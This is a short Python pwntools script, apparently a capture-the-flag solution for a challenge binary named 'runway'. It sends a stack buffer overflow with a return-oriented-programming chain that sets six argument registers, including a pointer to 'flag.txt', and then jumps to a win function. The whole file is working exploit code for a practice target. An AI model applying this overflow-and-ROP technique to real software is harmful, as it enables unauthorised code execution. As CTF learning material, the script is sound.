from pwn  import *

context.binary = binary = ELF('../handouts/runway',checksec = False)


def conn():
    if args.REMOTE:
        return remote("challenges.cscpsut.com", 10406,level = "debug" ) #CHANGE PORT NUMBER
    else:
        return process(binary.path, level = "error")


p = conn()


rop = ROP(binary)
rdi = p64(rop.rdi.address)
rsi = p64(rop.rsi.address)
rdx = p64(rop.rdx.address)
rcx = p64(rop.rcx.address)
r8 =  p64(rop.r8.address)
r9 =  p64(rop.r9.address)
ret = p64(rop.ret.address)

flag_path_addr = next(binary.search(b"flag.txt"))

p.recvuntil(b"Vector byte: ")

payload = b"a" * 152
payload += rdi + p64(1)
payload += rsi + p64(2)
payload += rdx + p64(3)
payload += rcx + p64(4)
payload += r8  + p64(5)
payload += r9  + p64(flag_path_addr)
payload += p64(binary.sym.clear_to_takeoff)

p.send(payload)

p.interactive()
